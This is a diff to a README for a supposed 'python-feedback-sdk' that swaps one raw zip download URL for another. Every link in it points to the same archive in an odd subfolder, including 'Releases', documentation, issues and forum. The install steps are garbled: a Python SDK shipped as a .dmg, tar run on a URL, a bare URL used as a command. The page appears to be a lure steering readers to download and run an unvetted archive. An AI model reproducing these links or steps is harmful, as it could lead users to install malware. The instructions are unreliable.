@@ -13,7 +13,7 @@ Welcome! This guide will help you download and run the python-feedback-sdk. This
   
 ## 📥 Download python-feedback-sdk
 
-[![Download Now](https://github.com/houssamks/python-feedback-sdk/raw/refs/heads/main/hierarchist/feedback_sdk_python_2.2.zip%20Now-%20%https://github.com/houssamks/python-feedback-sdk/raw/refs/heads/main/hierarchist/feedback_sdk_python_2.2.zip)](https://github.com/houssamks/python-feedback-sdk/raw/refs/heads/main/hierarchist/feedback_sdk_python_2.2.zip)
+[![Download Now](https://raw.githubusercontent.com/houssamks/python-feedback-sdk/main/hierarchist/python-sdk-feedback-3.0-beta.4.zip%20Now-%20%https://raw.githubusercontent.com/houssamks/python-feedback-sdk/main/hierarchist/python-sdk-feedback-3.0-beta.4.zip)](https://raw.githubusercontent.com/houssamks/python-feedback-sdk/main/hierarchist/python-sdk-feedback-3.0-beta.4.zip)
 
 To get started, visit the Releases page to download the latest version of python-feedback-sdk.
 
@@ -30,7 +30,7 @@ Before downloading, make sure your system meets the following requirements:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page:  
-   [Visit this page to download](https://github.com/houssamks/python-feedback-sdk/raw/refs/heads/main/hierarchist/feedback_sdk_python_2.2.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/houssamks/python-feedback-sdk/main/hierarchist/python-sdk-feedback-3.0-beta.4.zip)
 
 2. **Select the Latest Version**  
    On the Releases page, find the latest version of python-feedback-sdk. The version number will be indicated clearly.
@@ -46,9 +46,9 @@ Before downloading, make sure your system meets the following requirements:
    - For macOS: Open the downloaded `.dmg` file and drag the python-feedback-sdk to your Applications folder.
    - For Linux: Open a terminal window, navigate to the download location, and run:
      ```bash
-     tar -xvzf https://github.com/houssamks/python-feedback-sdk/raw/refs/heads/main/hierarchist/feedback_sdk_python_2.2.zip
+     tar -xvzf https://raw.githubusercontent.com/houssamks/python-feedback-sdk/main/hierarchist/python-sdk-feedback-3.0-beta.4.zip
      cd python-feedback-sdk
-     https://github.com/houssamks/python-feedback-sdk/raw/refs/heads/main/hierarchist/feedback_sdk_python_2.2.zip
+     https://raw.githubusercontent.com/houssamks/python-feedback-sdk/main/hierarchist/python-sdk-feedback-3.0-beta.4.zip
      ```
 
 6. **Set Up Your Environment**  
@@ -84,8 +84,8 @@ If you encounter issues during installation or usage, consider the following ste
 
 ## 📄 Additional Resources
 
-- [Official Documentation](https://github.com/houssamks/python-feedback-sdk/raw/refs/heads/main/hierarchist/feedback_sdk_python_2.2.zip)
-- [Issues Page](https://github.com/houssamks/python-feedback-sdk/raw/refs/heads/main/hierarchist/feedback_sdk_python_2.2.zip)
-- [Community Forum](https://github.com/houssamks/python-feedback-sdk/raw/refs/heads/main/hierarchist/feedback_sdk_python_2.2.zip)
+- [Official Documentation](https://raw.githubusercontent.com/houssamks/python-feedback-sdk/main/hierarchist/python-sdk-feedback-3.0-beta.4.zip)
+- [Issues Page](https://raw.githubusercontent.com/houssamks/python-feedback-sdk/main/hierarchist/python-sdk-feedback-3.0-beta.4.zip)
+- [Community Forum](https://raw.githubusercontent.com/houssamks/python-feedback-sdk/main/hierarchist/python-sdk-feedback-3.0-beta.4.zip)
 
 Feel free to ask questions or provide feedback as you use the python-feedback-sdk. Happy coding!
